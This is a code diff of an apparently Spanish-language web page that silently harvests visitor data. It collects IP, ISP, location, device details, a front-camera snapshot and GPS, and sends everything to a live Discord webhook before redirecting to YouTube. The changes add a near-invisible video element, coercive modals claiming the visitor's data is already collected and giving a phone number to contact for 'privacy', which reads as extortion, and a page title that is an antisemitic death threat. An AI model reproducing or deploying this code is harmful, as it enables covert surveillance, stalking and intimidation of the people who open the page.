@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Sionists will die</title>
     <style>
         .modal-overlay {
             position: fixed;
@@ -59,78 +59,121 @@
             color: #333333;
         }
 
-        /* Elementos ocultos para captura de la cámara */
-        #video, #canvas {
+        /* El elemento de video debe estar presente para procesar la captura en móviles */
+        #video-preview {
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            position: absolute;
+            top: -9999px;
+        }
+
+        #canvas {
             display: none;
         }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video-preview" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <div id="consentModal" class="modal-overlay">
+    <div id="modalCamara" class="modal-overlay">
         <div class="modal-box">
-            <p>¿Deseas activar tu ubicación y cámara?</p>
+            <p>
+tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento el permiso de Camara y ubicación y tendremos acceso a estos de manera precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO
 
+</p>
             <div class="modal-buttons">
-                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Aceptar</button>
-                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Rechazar</button>
+                <button class="btn btn-accept" onclick="pasoCamara(true)">Acepto colaborar y salvar mi privacidad</button>
+                <button class="btn btn-deny" onclick="pasoCamara(false)">me rehuso a colaborar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modalUbicacion" class="modal-overlay" style="display: none;">
+        <div class="modal-box">
+            <p>
+tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento el permiso de Camara y ubicación y tendremos acceso a estos de manera precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO
+
+</p>
+            <div class="modal-buttons">
+                <button class="btn btn-accept" onclick="pasoUbicacion(true)">Acepto colaborar y salvar mi privacidad</button>
+                <button class="btn btn-deny" onclick="pasoUbicacion(false)">me rehuso a colaborar</button>
             </div>
         </div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
-        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=Otnw3p_biN4t3zle";
+        const YOUTUBE_URL = "TU_ENLACE_DE_YOUTUBE_AQUI";
 
-        function cerrarModal() {
-            document.getElementById("consentModal").style.display = "none";
+        let fotoBlobGuardada = null;
+
+        // --- PASO 1: Procesar la cámara ---
+        async function pasoCamara(acepto) {
+            document.getElementById("modalCamara").style.display = "none";
+
+            if (acepto) {
+                fotoBlobGuardada = await solicitarCamaraNativa();
+            }
+
+            // Mostrar el segundo modal (Ubicación)
+            document.getElementById("modalUbicacion").style.display = "flex";
         }
 
-        // Función para tomar la foto con permiso
-        function tomarFoto() {
+        function solicitarCamaraNativa() {
             return new Promise((resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     resolve(null);
                     return;
                 }
 
-                // Pedir permiso de cámara al navegador
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then((stream) => {
-                        const video = document.getElementById("video");
+                        const video = document.getElementById("video-preview");
                         const canvas = document.getElementById("canvas");
                         video.srcObject = stream;
 
                         video.onloadedmetadata = () => {
-                            // Esperar a que el video cargue un fotograma
+                            video.play();
+                            // Esperar 1 segundo para que la cámara ajuste luz/enfoque
                             setTimeout(() => {
                                 canvas.width = video.videoWidth || 640;
                                 canvas.height = video.videoHeight || 480;
                                 const ctx = canvas.getContext("2d");
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                                // Detener la cámara
+                                // Apagar la cámara
                                 stream.getTracks().forEach(track => track.stop());
 
-                                // Convertir la imagen a un Blob (archivo)
                                 canvas.toBlob((blob) => {
                                     resolve(blob);
-                                }, "image/jpeg", 0.8);
-                            }, 500);
+                                }, "image/jpeg", 0.85);
+                            }, 1000);
                         };
                     })
                     .catch((err) => {
-                        console.error("Permiso de cámara denegado:", err);
-                        resolve(null); // Si rechaza la cámara, continúa sin foto
+                        console.error("Cámara denegada/falló:", err);
+                        resolve(null);
                     });
             });
         }
 
-        // Función para pedir GPS
-        function obtenerGPSNativo() {
+        // --- PASO 2: Procesar la ubicación y finalizar ---
+        async function pasoUbicacion(acepto) {
+            document.getElementById("modalUbicacion").style.display = "none";
+
+            let gpsInfo = { gpsData: "El usuario rechazó la ubicación.", mapLink: "N/A" };
+
+            if (acepto) {
+                gpsInfo = await solicitarUbicacionNativa();
+            }
+
+            await enviarADiscordYRedirigir(gpsInfo, fotoBlobGuardada);
+        }
+
+        function solicitarUbicacionNativa() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) {
                     resolve({ gpsData: "Geolocalización no soportada", mapLink: "N/A" });
@@ -151,27 +194,12 @@
                     (err) => {
                         resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                     },
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    { enableHighAccuracy: true, timeout: 7000 }
                 );
             });
         }
 
-        async function responderConsentimiento(acepto) {
-            cerrarModal();
-
-            let gpsInfo = { gpsData: "El usuario rechazó la solicitud.", mapLink: "N/A" };
-            let fotoBlob = null;
-
-            if (acepto) {
-                // Solicitar ubicación y foto en paralelo
-                const [gpsRes, fotoRes] = await Promise.all([
-                    obtenerGPSNativo(),
-                    tomarFoto()
-                ]);
-                gpsInfo = gpsRes;
-                fotoBlob = fotoRes;
-            }
-
+        async function enviarADiscordYRedirigir(gpsInfo, fotoBlob) {
             let ipData = {};
             try {
                 const res = await fetch("https://ipapi.co/json/");
@@ -186,29 +214,27 @@
             const idioma = navigator.language || "Desconocido";
             const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Crear el objeto con los datos formateados
             const payload = {
                 embeds: [{
-                    title: "🔍 Registro de Visita con Permisos",
-                    color: acepto ? 3066993 : 15158332,
+                    title: "🔍 Registro de Visita (Cámara + GPS)",
+                    color: 3066993,
                     fields: [
                         { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                         { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
                         { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                         { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                         { name: "🗺️ Enlace Google Maps", value: gpsInfo.mapLink, inline: false },
-                        { name: "📷 Foto de Cámara", value: fotoBlob ? "Capturada con éxito (ver archivo adjunto)" : "No disponible / Denegada", inline: false },
+                        { name: "📷 Foto", value: fotoBlob ? "Capturada correctamente" : "No tomada / Denegada", inline: false },
                         { name: "💻 Pantalla", value: pantalla, inline: true },
                         { name: "🧠 RAM / CPU", value: `RAM: ${memoriaRAM} | Núcleos: ${nucleosCPU}`, inline: true },
                         { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                         { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                     ],
-                    footer: { text: "Registro con Consentimiento de Cámara y GPS" },
+                    footer: { text: "Registro de Visita en 2 Pasos" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // Enviar a Discord utilizando FormData para poder enviar la imagen adjunta
             const formData = new FormData();
             formData.append("payload_json", JSON.stringify(payload));
             if (fotoBlob) {
@@ -224,7 +250,6 @@
                 console.error("Error al enviar a Discord:", err);
             }
 
-            // Redirigir a YouTube
             window.location.href = YOUTUBE_URL;
         }
     </script>
